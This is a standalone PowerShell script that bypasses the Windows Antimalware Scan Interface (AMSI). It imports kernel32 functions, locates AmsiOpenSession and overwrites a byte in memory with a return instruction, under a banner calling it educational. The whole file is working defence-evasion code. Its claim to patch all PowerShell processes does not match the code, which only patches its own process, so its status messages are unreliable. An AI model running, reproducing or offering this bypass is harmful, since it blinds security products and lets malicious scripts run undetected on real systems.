# ================= Banner =================
$banner = @'
    --------------------------------------
     Developed by Chris Alupului | 9/12/25
     Created for educational purposes only
    --------------------------------------
'@

Write-Host $banner -ForegroundColor Blue
$null = Read-Host "Press Enter to continue"

# ================= Win32 Interop =================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Neo {
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string dllName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

# ================= Patch Function =================
function Patch-AMSIProcess {
    param([System.Diagnostics.Process]$Process)

    Write-Host "Patching process: $($Process.ProcessName) ID $($Process.Id)" -ForegroundColor Cyan

    try {
        $amsi = [Neo]::LoadLibrary("amsi.dll")
        if ($amsi -eq [IntPtr]::Zero) { Write-Host "Failed to load amsi.dll" -ForegroundColor Red; return }

        $func = [Neo]::GetProcAddress($amsi, "AmsiOpenSession")
        if ($func -eq [IntPtr]::Zero) { Write-Host "Failed to get AmsiOpenSession address" -ForegroundColor Red; return }

        $patchAddr = [IntPtr]($func.ToInt64() + 3)
        $oldProtect = 0
        [Neo]::VirtualProtect($patchAddr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
        [System.Runtime.InteropServices.Marshal]::WriteByte($patchAddr, 0xC3)

        Write-Host "Bypass applied to process $($Process.Id)" -ForegroundColor Green
    }
    catch {
        Write-Host "Error patching process $($Process.Id): $_" -ForegroundColor Red
    }
}

Write-Host "Starting patch for all PowerShell processes..." -ForegroundColor Cyan

Get-Process -Name "powershell" -ErrorAction SilentlyContinue | ForEach-Object {
    Patch-AMSIProcess -Process $_
}

Write-Host "AMSI patching completed." -ForegroundColor Green
